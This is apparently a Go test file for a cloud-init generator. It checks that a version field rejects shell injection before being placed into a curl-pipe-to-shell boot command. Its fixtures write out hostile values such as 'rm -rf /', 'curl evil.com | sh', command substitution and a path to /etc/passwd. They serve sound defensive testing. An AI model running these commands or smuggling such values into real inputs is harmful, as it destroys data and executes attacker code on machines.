package dr

// cloudinit_test.go — unit tests for CloudInit YAML generation and NselfVersion
// semver validation.
//
// Purpose: guard against template injection via NselfVersion. If NselfVersion
// contains shell metacharacters it would be interpolated into the curl|sh runcmd
// string in cloud-init YAML and could execute arbitrary commands on provisioned
// VMs at boot. The validation must reject these before any YAML is produced.

import (
	"strings"
	"testing"
)

// minimalParams returns valid CloudInitParams that satisfy all required fields
// except NselfVersion, which callers set per-test.
func minimalParams(version string) CloudInitParams {
	return CloudInitParams{
		DrillID:      "drill-abc123",
		SSHPublicKey: "ssh-ed25519 AAAA... test@nself",
		NselfVersion: version,
	}
}

// TestRenderCloudInit_ValidVersion verifies that a well-formed semver string
// produces valid YAML containing the version.
func TestRenderCloudInit_ValidVersion(t *testing.T) {
	cases := []string{"v1.1.8", "1.0.0", "v10.20.30", "0.0.1"}
	for _, ver := range cases {
		t.Run(ver, func(t *testing.T) {
			out, err := RenderCloudInit(minimalParams(ver))
			if err != nil {
				t.Fatalf("RenderCloudInit(%q) returned unexpected error: %v", ver, err)
			}
			if out == "" {
				t.Error("RenderCloudInit returned empty output")
			}
			// The rendered version should appear in the runcmd install line.
			if !strings.Contains(out, ver) {
				t.Errorf("rendered YAML does not contain version %q", ver)
			}
		})
	}
}

// TestRenderCloudInit_EmptyVersion verifies that an empty NselfVersion (meaning
// "install latest") is accepted and produces YAML without a version pin.
func TestRenderCloudInit_EmptyVersion(t *testing.T) {
	out, err := RenderCloudInit(minimalParams(""))
	if err != nil {
		t.Fatalf("RenderCloudInit(\"\") returned unexpected error: %v", err)
	}
	if out == "" {
		t.Error("RenderCloudInit returned empty output for empty version")
	}
}

// TestRenderCloudInit_MetacharactersRejected verifies that NselfVersion values
// containing shell metacharacters are rejected and produce no YAML output.
// This is the primary injection-guard test: a tampered build or supply-chain
// attack could set NselfVersion to a string like "1.1.8; rm -rf /" which would
// execute arbitrary commands on every provisioned DR drill VM.
func TestRenderCloudInit_MetacharactersRejected(t *testing.T) {
	malformed := []string{
		"1.1.8; rm -rf /",
		"1.1.8 && curl evil.com | sh",
		"1.1.8`id`",
		"1.1.8$(id)",
		"1.1.8\nrm -rf /",
		"../../../etc/passwd",
		"v1.1.8%0Arm+-rf+/", // URL-encoded newline — still not valid semver
		"latest",             // not a semver
		"v1.1.8-beta",        // pre-release tag — not accepted by strict pattern
		"v1.1.8+meta",        // build metadata — not accepted by strict pattern
	}
	for _, ver := range malformed {
		t.Run(ver, func(t *testing.T) {
			out, err := RenderCloudInit(minimalParams(ver))
			if err == nil {
				t.Errorf("RenderCloudInit(%q) returned nil error; expected rejection", ver)
			}
			if out != "" {
				t.Errorf("RenderCloudInit(%q) produced output despite invalid version; output must be empty on error", ver)
			}
		})
	}
}

// TestValidateSemver_HappyPath verifies the semver regex accepts all expected
// canonical version strings.
func TestValidateSemver_HappyPath(t *testing.T) {
	valid := []string{"", "v1.1.8", "1.0.0", "v0.0.1", "v10.200.3000"}
	for _, v := range valid {
		if err := validateSemver(v); err != nil {
			t.Errorf("validateSemver(%q) returned unexpected error: %v", v, err)
		}
	}
}

// TestValidateSemver_RejectsInvalid verifies the semver regex rejects strings
// that are not strict MAJOR.MINOR.PATCH.
func TestValidateSemver_RejectsInvalid(t *testing.T) {
	invalid := []string{
		"latest",
		"v1.1",
		"v1",
		"1.1.8-rc1",
		"1.1.8+build",
		"v1.1.8; echo pwned",
		" v1.1.8",
		"v1.1.8 ",
		"",
	}
	// Empty string is explicitly allowed; re-run only the non-empty cases.
	for _, v := range invalid {
		if v == "" {
			continue
		}
		if err := validateSemver(v); err == nil {
			t.Errorf("validateSemver(%q) returned nil; expected error for invalid semver", v)
		}
	}
}
